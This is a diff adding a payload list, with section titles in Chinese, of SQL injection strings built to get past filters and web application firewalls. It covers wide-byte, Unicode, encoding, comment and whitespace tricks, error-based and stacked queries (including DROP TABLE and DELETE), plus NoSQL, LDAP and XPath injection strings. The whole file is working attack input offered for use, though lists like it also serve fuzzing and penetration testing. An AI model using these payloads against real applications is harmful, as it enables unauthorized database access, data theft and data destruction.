@@ -1,0 +1,217 @@
+# 奇葩 SQLi - 骚操作绕过
+
+# ========== 科学计数法 ==========
+1e0UNION SELECT 1
+0e0UNION SELECT 1
+1.0UNION SELECT 1
+1E0UNION SELECT NULL
+0.0union select 1
+
+# ========== 宽字节注入 (GBK/GB2312) ==========
+%bf%27 OR 1=1--
+%df%27 OR 1=1--
+%af%27 OR 1=1--
+%cf%27 OR 1=1--
+運' OR 1=1--
+縗' OR 1=1--
+%bf%5c' OR 1=1--
+%ec%27 OR 1=1--
+
+# ========== Unicode 绕过 ==========
+%u0027 OR 1=1--
+%uff07 OR 1=1--
+%c0%27 OR 1=1--
+%c0%a7 OR 1=1--
+%e0%80%a7 OR 1=1--
+ʼ OR 1=1--
+＇ OR 1=1--
+
+# ========== 换行符绕过 ==========
+'%0aOR%0a'1'='1
+'%0dOR%0d'1'='1
+'%0d%0aOR%0d%0a'1'='1
+UNION%0aSELECT%0a1
+UNION%0dSELECT%0d1
+'%0bOR%0b'1'='1
+'%0cOR%0c'1'='1
+
+# ========== Tab/特殊空白 ==========
+'%09OR%09'1'='1
+'%0bOR%0b'1'='1
+'%0cOR%0c'1'='1
+'%a0OR%a0'1'='1
+UNION%09SELECT%091
+UNION%0bSELECT%0b1
+UNION%a0SELECT%a01
+
+# ========== 括号代替空格 ==========
+'OR(1=1)--
+UNION(SELECT(1))
+(SELECT(1))FROM(dual)
+'AND(1)=(1)--
+'OR(1)LIKE(1)--
+UNION(SELECT(table_name)FROM(information_schema.tables))
+
+# ========== 反引号 (MySQL) ==========
+`union``select`1
+union`select`1
+`union`select`1`
+SELECT`table_name`FROM`information_schema`.`tables`
+
+# ========== 花括号 (MySQL) ==========
+{union select 1}
+{`union`select`1`}
+UNION{SELECT}1
+{a]union[a}select{b]1
+
+# ========== 注释嵌套/变体 ==========
+/**/UNION/**/SELECT/**/1
+/*!UNION*//*!SELECT*/1
+/*!50000UNION*//*!50000SELECT*/1
+/*%00*/UNION/*%00*/SELECT/*%00*/1
+/**_**/UNION/**_**/SELECT/**_**/1
+/*--*/UNION/*--*/SELECT/*--*/1
+/***UNION***/SELECT/***1***/
+#%0aUNION SELECT 1
+-- %0aUNION SELECT 1
+
+# ========== MySQL 版本注释 ==========
+/*!12345UNION*//*!12345SELECT*/1
+/*!32302UNION*//*!32302SELECT*/1
+/*!50000UNION*/SELECT 1
+UNION/*!50000SELECT*/1
+/*!00000UNION*//*!00000SELECT*/1
+
+# ========== 双重编码 ==========
+%252f%252a*/UNION%252f%252a*/SELECT
+%2527 OR 1=1--
+%25%32%37 OR 1=1--
+%u0025%u0032%u0037 OR 1=1--
+
+# ========== HPP (HTTP Parameter Pollution) ==========
+id=1&id=' OR 1=1--
+id=1/*&id=*/' OR 1=1--
+id=1'/*&id=*/OR'1'='1
+
+# ========== LIKE/BETWEEN/IN 绕过等号 ==========
+' OR 1 LIKE 1--
+' OR 1 BETWEEN 1 AND 1--
+' OR 1 IN (1)--
+' OR 1 REGEXP 1--
+' OR 1 RLIKE 1--
+' OR 1<>0--
+' OR NOT 1=0--
+
+# ========== 位运算 ==========
+' OR 1&1--
+' OR 1|0--
+' OR ~0--
+' OR 1^0--
+' OR 1<<0--
+
+# ========== 无空格无逗号 ==========
+'UNION(SELECT(1))
+'UNION(SELECT(table_name)FROM(information_schema.tables))
+UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b
+'AND(SELECT*FROM(SELECT(SLEEP(3)))a)--
+
+# ========== 字符串拼接 ==========
+CONCAT(0x27,0x4f52,0x27)
+CHAR(39)+CHAR(79)+CHAR(82)+CHAR(39)
+CHR(39)||CHR(79)||CHR(82)||CHR(39)
+'||'OR'||'
+'+'OR'+'
+
+# ========== 十六进制 ==========
+0x27 OR 1=1--
+' OR 0x31=0x31--
+UNION SELECT 0x61646d696e
+' OR username=0x61646d696e--
+
+# ========== 条件语句变体 ==========
+' OR IF(1,1,0)--
+' OR IFNULL(NULL,1)--
+' OR NULLIF(1,2)--
+' OR COALESCE(NULL,1)--
+' OR CASE WHEN 1=1 THEN 1 ELSE 0 END--
+' OR IIF(1=1,1,0)--
+
+# ========== 子查询绕过 ==========
+' OR (SELECT 1)=1--
+' OR 1=(SELECT 1)--
+' AND (SELECT COUNT(*) FROM users)>0--
+' OR EXISTS(SELECT 1)--
+
+# ========== JSON 函数 (MySQL 5.7+) ==========
+' OR JSON_EXTRACT('{"a":1}','$.a')=1--
+' UNION SELECT JSON_ARRAYAGG(table_name) FROM information_schema.tables--
+
+# ========== 窗口函数 (MySQL 8+) ==========
+' UNION SELECT ROW_NUMBER() OVER()--
+' ORDER BY ROW_NUMBER() OVER()--
+
+# ========== 特殊函数绕过 ==========
+' OR MID(version(),1,1)='5'--
+' OR SUBSTR(version(),1,1)='5'--
+' OR LEFT(version(),1)='5'--
+' OR INSTR(version(),'5')>0--
+' OR LOCATE('5',version())>0--
+' OR POSITION('5' IN version())>0--
+
+# ========== ORDER BY 注入 ==========
+1 ORDER BY 1--
+1 ORDER BY 1,2,3--
+1 ORDER BY IF(1=1,1,2)--
+1 ORDER BY RAND()--
+1 ORDER BY (SELECT 1)--
+1 ORDER BY SLEEP(3)--
+
+# ========== LIMIT 注入 ==========
+1 LIMIT 1,1 PROCEDURE ANALYSE()--
+1 LIMIT 1,1 INTO OUTFILE '/tmp/x'--
+1 LIMIT 0,1 UNION SELECT 1--
+
+# ========== 报错注入变体 ==========
+' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
+' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND EXP(~(SELECT * FROM (SELECT version())a))--
+' AND GTID_SUBSET(version(),1)--
+' AND JSON_KEYS((SELECT CONVERT((SELECT version()) USING utf8)))--
+
+# ========== 堆叠查询变体 ==========
+'; SELECT 1--
+'; SELECT SLEEP(3)--
+'; INSERT INTO x VALUES(1)--
+'; UPDATE x SET y=1--
+'; DELETE FROM x--
+'; DROP TABLE x--
+
+# ========== 二次注入 payload ==========
+admin'--
+admin'#
+admin'/*
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+
+# ========== NoSQL 注入 (MongoDB) ==========
+' || '1'=='1
+{"$gt":""}
+{"$ne":""}
+{"$regex":".*"}
+{"$where":"1==1"}
+'; return true; var x='
+'; return this.password.match(/.*/)//
+
+# ========== LDAP 注入 ==========
+*)(uid=*))(|(uid=*
+admin)(&)
+admin)(|(password=*))
+*)(objectClass=*))(&(objectClass=void
+
+# ========== XPath 注入 ==========
+' or '1'='1
+' or ''='
+x]|//*|//*[x
+admin' or '1'='1
